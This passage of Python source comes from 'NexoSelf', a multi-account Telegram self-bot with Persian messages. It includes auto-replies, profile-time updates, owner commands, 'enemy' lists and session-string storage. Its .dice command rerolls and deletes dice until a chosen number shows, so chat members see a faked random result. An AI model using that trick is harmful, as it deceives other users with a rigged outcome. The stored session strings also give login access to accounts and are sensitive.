    async def load_secretary_messages(self):
        try:
            db = os.path.join(DATABASE_DIR, f"bot_data_{self.phone.replace('+', '')}.db")
            conn = sqlite3.connect(db)
            cursor = conn.cursor()
            cursor.execute('SELECT pattern, response FROM secretary WHERE is_active = 1')
            results = cursor.fetchall()
            conn.close()
            
            self.secretary_messages = {}
            for pattern, response in results:
                self.secretary_messages[pattern.lower()] = response
                
            print(f"✅ {len(self.secretary_messages)} پیام منشی برای {self.phone} بارگذاری شد")
        except Exception as e:
            print(f"خطا در بارگذاری پیام‌های منشی برای {self.phone}: {e}")
    
    async def load_auto_forward_settings(self):
        try:
            db = os.path.join(DATABASE_DIR, f"bot_data_{self.phone.replace('+', '')}.db")
            conn = sqlite3.connect(db)
            cursor = conn.cursor()
            cursor.execute('SELECT source_channel, target_group FROM auto_forward WHERE is_active = 1')
            results = cursor.fetchall()
            conn.close()
            
            self.auto_forward_settings = {}
            for source, target in results:
                if source not in self.auto_forward_settings:
                    self.auto_forward_settings[source] = []
                self.auto_forward_settings[source].append(target)
                
            print(f"✅ {len(results)} تنظیمات فوروارد برای {self.phone} بارگذاری شد")
        except Exception as e:
            print(f"خطا در بارگذاری تنظیمات فوروارد برای {self.phone}: {e}")
    
    async def auto_reply_secretary(self):
        @self.client.on(events.NewMessage(incoming=True))
        async def secretary_handler(event):
            try:
                if event.sender_id == self.owner_id:
                    return
                    
                js = self.get_data()
                if js.get('secretary') != 'on':
                    return
                    
                message_text = event.raw_text.lower().strip()
                
                if any(greeting in message_text for greeting in ['سلام', 'hello', 'hi', 'سلامت']):
                    await event.reply(f"🌹 **درود!**\nچطور می‌تونم کمک کنم؟")
                    
                elif any(greeting in message_text for greeting in ['چطوری', 'حالتون', 'خوبی', 'چخبر']):
                    await event.reply(f"✨ **سلامت باشید!**\nمن خوبم ممنون 😊\nشما چطورید؟")
                    
                elif any(time_word in message_text for time_word in ['ساعت', 'time', 'چند شد']):
                    current_time = datetime.now().strftime("%H:%M:%S")
                    await event.reply(f"🕒 **ساعت فعلی:** `{current_time}`")
                    
                elif any(date_word in message_text for date_word in ['تاریخ', 'date', 'امروز چندمه']):
                    current_date = datetime.now().strftime("%Y/%m/%d")
                    await event.reply(f"📅 **تاریخ امروز:** `{current_date}`")
                    
                elif message_text in self.secretary_messages:
                    response = self.secretary_messages[message_text]
                    response = response.replace('{time}', datetime.now().strftime("%H:%M"))
                    response = response.replace('{date}', datetime.now().strftime("%Y/%m/%d"))
                    await event.reply(response)
                    
            except Exception as e:
                print(f"خطا در منشی هوشمند برای {self.phone}: {e}")
    
    async def register_settings_handlers(self):
        @self.client.on(events.NewMessage(pattern=r'\.(online|typing|secretary|autoreply|autoforward|timename|timebio) (on|off)'))
        async def settings_handler(event):
            try:
                if event.sender_id != self.owner_id:
                    return
                    
                command = event.pattern_match.group(1)
                value = event.pattern_match.group(2)
                
                js = self.get_data()
                old_value = js.get(command, 'off')
                js[command] = value
                self.put_data(js)
                
                if command == "online" and value == "on":
                    await self.set_online_status()
                elif command == "timename" and value == "on":
                    await self.force_time_update()
                    response_msg = "✅ **زمان در نام خانوادگی فعال شد**\n🕒 زمان از الان در نام خانوادگی نمایش داده می‌شود"
                elif command == "timename" and value == "off":
                    me = await self.client.get_me()
                    original_last_name = me.last_name or ""
                    if original_last_name and any(char in original_last_name for char in '𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿₀₁₂₃₄₅₆₇₈₉'):
                        parts = original_last_name.split(' ')
                        clean_parts = [part for part in parts if not any(char in part for char in '𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿₀₁₂₃₄₅₆₇₈₉')]
                        clean_last_name = ' '.join(clean_parts)
                        await self.client(functions.account.UpdateProfileRequest(last_name=clean_last_name))
                    response_msg = "✅ **زمان در نام خانوادگی غیرفعال شد**"
                elif command == "timebio" and value == "on":
                    await self.force_time_update()
                    try:
                        full_user = await self.client(GetFullUserRequest('me'))
                        js["original_bio"] = full_user.full_user.about or ""
                        self.put_data(js)
                    except Exception as e:
                        print(f"خطا در ذخیره بیوگرافی برای {self.phone}: {e}")
                    response_msg = "✅ **زمان در بیوگرافی فعال شد**\n🕒 زمان از الان در بیوگرافی نمایش داده می‌شود"
                elif command == "timebio" and value == "off":
                    original_bio = js.get("original_bio", "")
                    await self.client(functions.account.UpdateProfileRequest(about=original_bio))
                    response_msg = "✅ **زمان در بیوگرافی غیرفعال شد**"
                else:
                    command_names = {
                        "online": "حالت آنلاین",
                        "typing": "اکشن تایپینگ",
                        "secretary": "منشی هوشمند",
                        "autoreply": "پاسخگویی خودکار",
                        "autoforward": "فوروارد خودکار"
                    }
                    response_msg = f"✅ **{command_names.get(command, command)}** `{value}` شد"
                
                await event.reply(response_msg)
                await event.delete()
                
            except Exception as e:
                print(f"خطا در تنظیمات برای {self.phone}: {e}")
                try:
                    await event.reply(f"❌ **خطا در اجرای دستور:** {e}")
                except:
                    pass
        
        @self.client.on(events.NewMessage(pattern=r'\.typing (\d+)'))
        async def typing_duration_handler(event):
            try:
                if event.sender_id != self.owner_id:
                    return
                    
                duration = event.pattern_match.group(1)
                js = self.get_data()
                js["typing_duration"] = duration
                self.put_data(js)
                
                await event.reply(f"✅ **مدت زمان تایپینگ** به `{duration}` ثانیه تنظیم شد")
                await event.delete()
                
            except Exception as e:
                print(f"خطا در تنظیم مدت تایپینگ برای {self.phone}: {e}")
        
        @self.client.on(events.NewMessage(pattern=r'\.font ([1-9]|10)'))
        async def font_handler(event):
            try:
                if event.sender_id != self.owner_id:
                    return
                    
                font_num = event.pattern_match.group(1)
                js = self.get_data()
                js["font"] = font_num
                self.put_data(js)
                
                await event.reply(f"✅ **فونت زمان** به شماره `{font_num}` تغییر کرد")
                await event.delete()
                
            except Exception as e:
                print(f"خطا در تغییر فونت برای {self.phone}: {e}")
        
        @self.client.on(events.NewMessage(pattern=r'\.(addcrash|delcrash|addenemy|delenemy) (.*)'))
        async def user_management_handler(event):
            try:
                if event.sender_id != self.owner_id:
                    return
                    
                command = event.pattern_match.group(1)
                user_id_str = event.pattern_match.group(2)
                
                try:
                    user_id = int(user_id_str)
                except ValueError:
                    await event.reply("❌ **لطفاً یک ID معتبر وارد کنید**")
                    return
                    
                js = self.get_data()
                
                if command == "addcrash":
                    if user_id in js.get('crash', []):
                        txt = "✅ **کاربر از قبل در لیست کراش بود**"
                    else:
                        js.setdefault('crash', []).append(user_id)
                        txt = "✅ **کاربر به لیست کراش اضافه شد**"
                        
                elif command == "delcrash":
                    if user_id in js.get('crash', []):
                        js['crash'] = [x for x in js.get('crash', []) if x != user_id]
                        txt = "✅ **کاربر از لیست کراش حذف شد**"
                    else:
                        txt = "❌ **کاربر در لیست کراش نبود**"
                        
                elif command == "addenemy":
                    if user_id in js.get('enemy', []):
                        txt = "✅ **کاربر از قبل در لیست دشمنان بود**"
                    else:
                        js.setdefault('enemy', []).append(user_id)
                        txt = "✅ **کاربر به لیست دشمنان اضافه شد**"
                        
                elif command == "delenemy":
                    if user_id in js.get('enemy', []):
                        js['enemy'] = [x for x in js.get('enemy', []) if x != user_id]
                        txt = "✅ **کاربر از لیست دشمنان حذف شد**"
                    else:
                        txt = "❌ **کاربر در لیست دشمنان نبود**"
                
                self.put_data(js)
                await event.reply(txt)
                await event.delete()
                
            except Exception as e:
                print(f"خطا در مدیریت کاربران برای {self.phone}: {e}")
        
        @self.client.on(events.NewMessage(pattern=r'\.dice ([1-6])'))
        async def dice_handler(event):
            try:
                if event.sender_id != self.owner_id:
                    return
                    
                target_number = int(event.pattern_match.group(1))
                await event.delete()
                
                send = await self.client.send_file(event.chat_id, InputMediaDice('🎲'))
                while send.media.value != target_number:
                    await self.client.delete_messages(event.chat_id, send.id)
                    send = await self.client.send_file(event.chat_id, InputMediaDice('🎲'))
                    
            except Exception as e:
                print(f"خطا در دستور dice برای {self.phone}: {e}")
        
        @self.client.on(events.NewMessage(pattern=r'\.clean (\d+)'))
        async def clean_handler(event):
            try:
                if event.sender_id != self.owner_id:
                    return
                    
                count = int(event.pattern_match.group(1))
                message_id = event.message.id
                deleted = 0
                
                for i in range(count):
                    try:
                        await self.client.delete_messages(event.chat_id, message_id - i)
                        deleted += 1
                    except:
                        pass
                        
                await event.reply(f"✅ **{deleted}** پیام پاک شد")
                
            except Exception as e:
                print(f"خطا در دستور clean برای {self.phone}: {e}")
        
        @self.client.on(events.NewMessage(pattern=r'\.(football|basket|dart|slot)'))
        async def games_handler(event):
            try:
                if event.sender_id != self.owner_id:
                    return
                    
                game_type = event.pattern_match.group(1)
                emojis = {
                    'football': '⚽',
                    'basket': '🏀', 
                    'dart': '🎯',
                    'slot': '🎰'
                }
                
                if game_type in emojis:
                    await self.client.send_file(event.chat_id, InputMediaDice(emojis[game_type]))
                    await event.delete()
                    
            except Exception as e:
                print(f"خطا در دستور بازی برای {self.phone}: {e}")
        
        @self.client.on(events.NewMessage(pattern=r'\.addreply (.+)\|(.+)'))
        async def add_reply_handler(event):
            try:
                if event.sender_id != self.owner_id:
                    return
                    
                pattern = event.pattern_match.group(1).strip().lower()
                response = event.pattern_match.group(2).strip()
                
                db = os.path.join(DATABASE_DIR, f"bot_data_{self.phone.replace('+', '')}.db")
                conn = sqlite3.connect(db)
                cursor = conn.cursor()
                cursor.execute('INSERT INTO secretary (pattern, response) VALUES (?, ?)', (pattern, response))
                conn.commit()
                conn.close()
                
                self.secretary_messages[pattern] = response
                await event.reply(f"✅ **پاسخ جدید افزوده شد:**\n**الگو:** `{pattern}`\n**پاسخ:** `{response}`")
                await event.delete()
                
            except Exception as e:
                print(f"خطا در افزودن پاسخ برای {self.phone}: {e}")
    
    async def force_time_update(self):
        try:
            self.last_time_update = 0
            await self.update_profile_time()
        except Exception as e:
            print(f"خطا در به‌روزرسانی فوری زمان برای {self.phone}: {e}")
    
    async def update_profile_time(self):
        while self.is_running and not self.shutdown_requested:
            try:
                js = self.get_data()
                current_time = time.time()
                
                if current_time - self.last_time_update < 60:
                    await asyncio.sleep(60 - (current_time - self.last_time_update))
                    continue
                
                if js.get('timename') == 'off' and js.get('timebio') == 'off': 
                    await asyncio.sleep(60)
                    continue
                    
                tz = pytz.timezone("Asia/Tehran")
                now = datetime.now(tz).strftime("%H:%M")
                idx = int(js.get('font', '1')) - 1
                if 0 <= idx < len(self.fonts):
                    f = self.fonts[idx]
                    try:
                        ft = now.translate(str.maketrans("0123456789", f))
                    except:
                        ft = now
                else:
                    ft = now
                
                updates_done = []
                
                if js.get('timebio') == 'on': 
                    original_bio = js.get('original_bio', '')
                    if ' ' in original_bio:
                        parts = original_bio.split(' ')
                        if any(char in parts[-1] for char in '𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿₀₁₂₃₄₅₆₇₈₉'):
                            original_bio = ' '.join(parts[:-1])
                    
                    new_bio = f"{original_bio} {ft}".strip()
                    await self.client(functions.account.UpdateProfileRequest(about=new_bio))
                    updates_done.append("بیوگرافی")
                    print(f"✅ بیوگرافی برای {self.phone} به‌روزرسانی شد: {new_bio}")
                
                if js.get('timename') == 'on': 
                    await self.client(functions.account.UpdateProfileRequest(last_name=ft))
                    updates_done.append("نام خانوادگی")
                    print(f"✅ نام خانوادگی برای {self.phone} به‌روزرسانی شد: {ft}")
                
                if updates_done:
                    print(f"✅ به‌روزرسانی زمان برای {self.phone}: {', '.join(updates_done)}")
                
                self.last_time_update = current_time
                await asyncio.sleep(60)
                
            except Exception as e:
                print(f"خطا در به‌روزرسانی زمان برای {self.phone}: {e}")
                await asyncio.sleep(60)
    
    def get_data(self):
        try:
            db = os.path.join(DATABASE_DIR, f"bot_data_{self.phone.replace('+', '')}.db")
            conn = sqlite3.connect(db)
            cur = conn.cursor()
            cur.execute('SELECT key, value FROM settings')
            settings = {k: v for k, v in cur.fetchall()}
            cur.execute('SELECT user_id FROM crash')
            settings['crash'] = [r[0] for r in cur.fetchall()]
            cur.execute('SELECT user_id FROM enemy')
            settings['enemy'] = [r[0] for r in cur.fetchall()]
            conn.close()
            return settings
        except Exception as e:
            print(f"خطا در خواندن داده‌ها برای {self.phone}: {e}")
            return {}
    
    def put_data(self, data):
        try:
            db = os.path.join(DATABASE_DIR, f"bot_data_{self.phone.replace('+', '')}.db")
            conn = sqlite3.connect(db)
            cur = conn.cursor()
            for k, v in data.items():
                if k not in ['crash', 'enemy']:
                    cur.execute('INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)', (k, v))
            if 'crash' in data:
                cur.execute('DELETE FROM crash')
                cur.executemany('INSERT INTO crash(user_id) VALUES (?)', [(u,) for u in data['crash']])
            if 'enemy' in data:
                cur.execute('DELETE FROM enemy')
                cur.executemany('INSERT INTO enemy(user_id) VALUES (?)', [(u,) for u in data['enemy']])
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"خطا در نوشتن داده‌ها برای {self.phone}: {e}")
    
    async def check_expiration(self):
        while self.is_running and not self.shutdown_requested:
            if not self.is_self_valid():
                print(f"❌ اکانت {self.phone} منقضی شده است. توقف...")
                await send_to_admin(self.client, f"❌ اکانت {self.phone} منقضی شده است", self.phone)
                await self.client.disconnect()
                break
            await asyncio.sleep(60)
    
    def is_self_valid(self):
        try:
            if not os.path.exists(USERS_DB):
                return True
                
            conn = sqlite3.connect(USERS_DB)
            c = conn.cursor()
            c.execute("SELECT expiration_date FROM users WHERE phone = ?", (self.phone,))
            result = c.fetchone()
            conn.close()
            if result and result[0]:
                expiration_date = datetime.strptime(result[0], '%Y-%m-%d %H:%M:%S')
                return datetime.now() < expiration_date
            return True
        except Exception as e:
            print(f"خطا در بررسی انقضا برای {self.phone}: {e}")
            return True
    
    async def run(self):
        try:
            success = await self.robust_initialize()
            if success:
                print(f"🚀 اکانت {self.phone} در حال اجرا است...")
                await self.client.run_until_disconnected()
            else:
                print(f"❌ اکانت {self.phone} راه‌اندازی نشد")
        except Exception as e:
            print(f"❌ خطا در اجرای اکانت {self.phone}: {e}")
        finally:
            self.is_running = False

async def create_session_file(phone, session_file):
    try:
        print(f"📱 ایجاد سشن جدید برای {phone}...")
        
        client = TelegramClient(StringSession(), API_ID, API_HASH,
                              device_model="iPhone 15 Pro",
                              system_version="iOS 17.1",
                              app_version="10.0.0")
        
        await client.connect()
        
        sent_code = await client.send_code_request(phone)
        print(f"✅ کد تأیید برای {phone} ارسال شد")
        
        code = input(f"📝 لطفاً کد تأیید ارسال شده برای {phone} را وارد کنید: ").strip()
        
        try:
            await client.sign_in(phone, code)
            print(f"✅ لاگین موفقیت‌آمیز برای {phone}")
        except SessionPasswordNeededError:
            password = input("🔐 لطفاً رمز دو مرحله‌ای را وارد کنید: ")
            await client.sign_in(password=password)
            print(f"✅ لاگین با رمز دو مرحله‌ای موفقیت‌آمیز برای {phone}")
        
        session_string = client.session.save()
        with open(session_file, 'w') as f:
            f.write(session_string)
        
        print(f"✅ سشن برای {phone} در {session_file} ذخیره شد")
        await client.disconnect()
        return session_string
        
    except Exception as e:
        print(f"❌ خطا در ایجاد سشن برای {phone}: {e}")
        return None

async def main():
    if len(sys.argv) < 3:
        print("""
🚀 **راه‌اندازی NexoSelf**

📝 **نحوه استفاده:**
├ • افزودن اکانت جدید:
│   python script.py <phone> <session_file>
│
├ • اجرای تمام اکانت‌ها:
│   python script.py --multi
│
├ • ایجاد سشن جدید:
│   python script.py --create <phone> <session_file>
└
📞 **مثال‌ها:**
├ • python script.py +1234567890 session1.txt
├ • python script.py --multi
└ • python script.py --create +1234567890 newsession.txt
        """)
        sys.exit(1)
    
    account_manager = AccountManager()
    
    if sys.argv[1] == "--create":
        if len(sys.argv) < 4:
            print("❌ لطفاً شماره و نام فایل سشن را وارد کنید")
            sys.exit(1)
        
        phone = sys.argv[2]
        session_file = sys.argv[3]
        
        session_string = await create_session_file(phone, session_file)
        if session_string:
            account_manager.add_account(phone, session_string)
            print(f"✅ اکانت {phone} با موفقیت اضافه شد")
        else:
            print(f"❌ خطا در ایجاد سشن برای {phone}")
        
    elif sys.argv[1] == "--multi":
        print("🔧 راه‌اندازی حالت چند اکانته...")
        accounts = account_manager.get_all_accounts()
        
        if not accounts:
            print("❌ هیچ اکانتی در دیتابیس یافت نشد.")
            print("برای افزودن اکانت از دستور زیر استفاده کنید:")
            print("python script.py --create <phone> <session_file>")
            sys.exit(1)
        
        print(f"✅ تعداد {len(accounts)} اکانت برای راه‌اندازی یافت شد")
        
        tasks = []
        for phone, session_string in accounts:
            print(f"🔄 راه‌اندازی اکانت {phone}...")
            account = TelegramAccount(phone, session_string, account_manager)
            task = asyncio.create_task(account.run())
            tasks.append(task)
            await asyncio.sleep(3)
        
        print("🚀 تمام اکانت‌ها در حال اجرا هستند...")
        await asyncio.gather(*tasks, return_exceptions=True)
        
    else:
        phone = sys.argv[1]
        session_file = sys.argv[2]
        
        if not os.path.exists(session_file):
            print(f"❌ فایل سشن {session_file} یافت نشد.")
            print("برای ایجاد سشن جدید از دستور زیر استفاده کنید:")
            print(f"python script.py --create {phone} {session_file}")
            sys.exit(1)
        
        try:
            with open(session_file, 'r') as f:
                session_str = f.read().strip()
        except Exception as e:
            print(f"❌ خطا در خواندن فایل سشن: {e}")
            sys.exit(1)
        
        if not session_str:
            print(f"❌ فایل سشن {session_file} خالی است.")
            print("برای ایجاد سشن جدید از دستور زیر استفاده کنید:")
            print(f"python script.py --create {phone} {session_file}")
            sys.exit(1)
        
        account_manager.add_account(phone, session_str)
        
        print(f"🔄 راه‌اندازی اکانت {phone}...")
        account = TelegramAccount(phone, session_str, account_manager)
        await account.run()

if __name__ == '__main__':
    try:
        print("""
┌────────────────────
│  🚀 **NexoSelf راه‌اندازی شد**  
│  🔮 **قدرت گرفته از:** @Ch_SelfNexo
└─────────────────────
        """)
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⏹ **برنامه توسط کاربر متوقف شد**")
    except Exception as e:
        print(f"❌ **خطای غیرمنتظره:** {e}")
